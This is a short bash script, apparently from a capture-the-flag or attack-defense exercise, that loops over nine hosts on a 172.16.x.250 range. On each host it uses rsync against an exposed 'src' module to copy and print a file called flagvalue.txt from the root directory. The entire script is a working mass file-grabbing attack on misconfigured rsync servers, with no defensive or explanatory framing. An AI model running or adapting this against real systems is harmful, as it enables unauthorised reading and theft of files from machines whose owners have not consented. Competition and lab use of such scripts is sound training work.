mkdir /rsync
for i in $(seq 101 109)
do
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
rsync -av rsync://$s/src/root/flagvalue.txt /rsync/$s.txt
cat /rsync/$s.txt
done